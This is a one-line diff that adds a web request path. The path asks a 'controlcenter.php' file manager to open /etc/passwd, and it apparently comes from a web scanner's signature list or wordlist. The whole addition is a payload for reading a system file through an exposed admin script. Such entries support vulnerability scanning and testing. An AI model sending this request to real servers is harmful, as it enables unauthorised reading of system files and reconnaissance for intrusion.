@@ -1,0 +1,1 @@
+/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open
